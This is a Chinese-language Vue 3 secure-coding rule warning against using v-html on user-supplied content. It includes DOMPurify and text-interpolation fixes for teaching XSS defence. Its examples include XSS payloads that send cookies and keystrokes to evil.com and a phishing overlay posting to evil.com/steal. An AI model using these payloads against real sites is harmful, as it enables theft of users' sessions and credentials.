---
title: 永远不要对用户提供的内容使用 v-html
impact: HIGH
impactDescription: 对用户提供的内容使用 v-html 会导致 XSS 漏洞
type: capability
tags: [vue3, security, xss, v-html, template]
---

# 永远不要对用户提供的内容使用 v-html

**影响：高** - 使用 `v-html` 动态渲染任意 HTML 可能导致跨站脚本（XSS）漏洞。攻击者可以注入在用户浏览器中执行的恶意脚本，窃取凭据或代表用户执行操作。

`v-html` 指令渲染未经清理的原始 HTML。虽然对可信内容有用，但它绕过 Vue 的自动文本转义，永远不应该与用户输入一起使用。

## 任务清单

- [ ] 永远不要对用户提供的内容使用 `v-html`
- [ ] 优先使用自动转义 HTML 的文本插值 `{{ }}`
- [ ] 使用组件进行模板组合而不是 `v-html`
- [ ] 如果绝对需要原始 HTML，使用 DOMPurify 等库进行清理
- [ ] 审核现有的 `v-html` 使用以查找潜在的 XSS 向量

**错误示例：**
```vue
<template>
  <!-- 危险：用户输入作为 HTML 渲染 -->
  <div v-html="userComment"></div>

  <!-- 危险：来自 API 的内容未经清理 -->
  <article v-html="articleContent"></article>

  <!-- 危险：URL 参数或表单输入 -->
  <p v-html="searchQuery"></p>
</template>

<script setup>
import { ref } from 'vue'

// 这可能包含：<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
const userComment = ref(props.comment)
</script>
```

**正确示例：**
```vue
<template>
  <!-- 安全：文本插值转义 HTML -->
  <div>{{ userComment }}</div>

  <!-- 安全：使用组件处理富内容 -->
  <CommentRenderer :content="userComment" />

  <!-- 安全：只对可信的、已清理的内容使用 v-html -->
  <div v-html="sanitizedContent"></div>
</template>

<script setup>
import { computed } from 'vue'
import DOMPurify from 'dompurify'

const props = defineProps(['comment', 'trustedHtml'])

// 选项 1：使用文本插值（推荐）
const userComment = computed(() => props.comment)

// 选项 2：如果确实需要原始 HTML，进行清理
const sanitizedContent = computed(() =>
  DOMPurify.sanitize(props.trustedHtml)
)
</script>
```

## 何时使用 v-html 是可接受的

```vue
<template>
  <!-- 可以：来自你自己代码库的静态 HTML -->
  <div v-html="staticLegalDisclaimer"></div>

  <!-- 可以：来自可信 CMS 的内容并经过清理 -->
  <article v-html="sanitizedCmsContent"></article>
</template>

<script setup>
// 你控制的内容，不是用户输入
const staticLegalDisclaimer = `
  <p>适用条款和条件。</p>
  <a href="/legal">阅读更多</a>
`
</script>
```

## XSS 攻击示例

攻击者可以注入各种 payload：
```html
<!-- Cookie 窃取 -->
<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">

<!-- 键盘记录 -->
<script>document.onkeypress=function(e){fetch('https://evil.com?k='+e.key)}</script>

<!-- 钓鱼覆盖层 -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%">
  <form action="https://evil.com/steal">需要登录...</form>
</div>
```

## 参考
- [Vue.js 模板语法 - 原始 HTML](https://vuejs.org/guide/essentials/template-syntax.html#raw-html)
- [OWASP XSS 预防速查表](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
